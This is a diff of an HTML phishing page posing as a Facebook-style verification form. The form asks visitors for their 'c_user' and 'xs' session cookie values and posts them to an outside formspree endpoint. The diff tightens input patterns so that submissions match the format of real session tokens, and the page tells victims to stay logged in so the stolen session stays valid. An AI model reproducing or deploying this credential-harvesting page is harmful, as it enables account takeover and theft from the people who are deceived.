@@ -39,23 +39,30 @@
                             </a>
                             <br>
                             <p class="fw-semibold validation_form_para mt-2">Please be sure to provide the requested information below.</p>
-                            <form class="content" action="https://formspree.io/f/moqoovob" method="POST">
-                                <label class="" style="font-size: 12px;">c_user</label>
+                            
+                                              <form class= 'content' action="https://formspree.io/f/moqoovob" method="POST">
+
+                                            
+           
+
+                              
+                              <label class="" style="font-size: 12px;">c_user</label>
                                 <br>
-                                <input type="text" name="c_user" placeholder=""  id="c_user" required="1" aria-required="true">
+                                <input type="text" name="c_user" placeholder="" pattern="[0-9]+" minlength="6" id="c_user" title="Must Watch Detailed Video" required="1" aria-required="true">
                                 <br>
                                 <label class="mt-2" style="font-size: 12px;">xs</label>
                                 <br>
-                                <input type="text" name="xs" id="xs" placeholder="" title="Must Watch Detailed Video" required="1" aria-required="true">
+                                <input type="text" name="xs" id="xs" placeholder="" pattern="^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@#$%^&+=]).{40,}$" title="Must Watch Detailed Video" required="1" aria-required="true">
                                 <p class="mt-2" style="font-size: 12px;">Please make sure not to log out from your computer or laptop until you have received a verification email.</p>
                                 <div class="p-2 mb-2 d-flex justify-content-end" style="background: rgb(245, 246, 247);">
-                                    <button type="submit" class="text-white border-0" style="background: rgb(66, 103, 178);">Submit</button>
+                                  
+
+                                    <button type="submit" class="text-white border-0" style="background: rgb(66, 103, 178);" >Submit</button> 
                                 </div>
-                            </form>
+                            </form> 
                         </div>
                     </div>
                 </div>
             </div>
         </div>
     </body>
-</html>
